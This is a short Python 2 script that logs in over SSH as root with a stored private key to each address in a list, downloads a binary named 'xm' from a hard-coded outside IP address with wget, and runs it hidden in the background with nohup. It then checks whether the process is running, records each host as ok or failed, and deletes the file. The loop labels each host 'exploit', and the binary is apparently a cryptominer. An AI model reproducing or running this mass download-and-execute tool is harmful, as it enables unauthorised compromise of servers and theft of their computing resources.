from add_ssh_user import *
import thread
import time


HEADER = '\033[95m'
OKGREEN = '\033[92m'
FAIL = '\033[91m'
WARNING = '\033[93m'
ps = "ps -aux"
wget = "wget -P /tmp http://221.213.80.188/xm && chmod +x /tmp/xm"
run = "nohup /tmp/xm > /dev/null 2>&1 &"
rmxm = "rm /tmp/xm"

def write_result(ip, result):
    fw = open(ip + '.txt', 'w')
    fw.write(result)
    fw.close()

def runCommands(client, host):
    result = execCommand(ps, client, host)
    ps_str = "".join(result)
    if "/tmp/xm" in ps_str:
        print OKGREEN + "xm is runnig ..." + OKGREEN
        write_result("ok/" + ip, ps_str)
    else:
        print "start to install xm ..."
        execCommand(wget, client, host)
        #time.sleep(10)
        print "start to new thread ..."
        thread.start_new_thread(execCommand, (run, client, host))
        time.sleep(10)
        result = execCommand(ps, client, host)
        ps_str = "".join(result)
        if "/tmp/xm" in ps_str:
            print OKGREEN + "xm is ok...." + OKGREEN
            write_result("ok/" + ip, ps_str)
        else:
            print FAIL + "failed ..." + FAIL
            write_result("failed/" + ip, ps_str)
        execCommand(rmxm, client, host)


def handleIp(ipstr):
    host =ipstr
    port = 22
    user ="root"
    pkey = "keys/id_rsa"
    encrypt_type = "rsa"

    client = getSshClientByPkey(host, port, user, pkey, encrypt_type)

    if not client:
        print "[Config Error] Client Not Connected!"
        return
    else:
        #return execCommand(cmd, client, host)
        runCommands(client, host)


if __name__=="__main__":
    
    ipfp = open("ip.txt","r")
    iplist = ipfp.readlines()
    for ip in iplist:
        print 'exploit '+ip.rstrip()
        handleIp(ip)
        # result = runCommand(ip, ps)
        # ps_str = "".join(result)
        # if "/tmp/xm" in ps_str:
        #     print OKGREEN + "xm is runnig ..." + OKGREEN
        #     write_result("ok/" + ip, ps_str)
        # else:
        #     print "start to install xm ..."
        #     runCommand(ip, wget)
        #     #time.sleep(10)
        #     print "start to new thread ..."
        #     thread.start_new_thread(runCommand, (ip, run))
        #     result = runCommand(ip, ps)
        #     ps_str = "".join(result)
        #     if "/tmp/xm" in ps_str:
        #         print OKGREEN + "xm is ok...." + OKGREEN
        #         write_result("ok/" + ip, ps_str)
        #     else:
        #         print FAIL + "failed ..." + FAIL
        #         write_result("failed/" + ip, ps_str)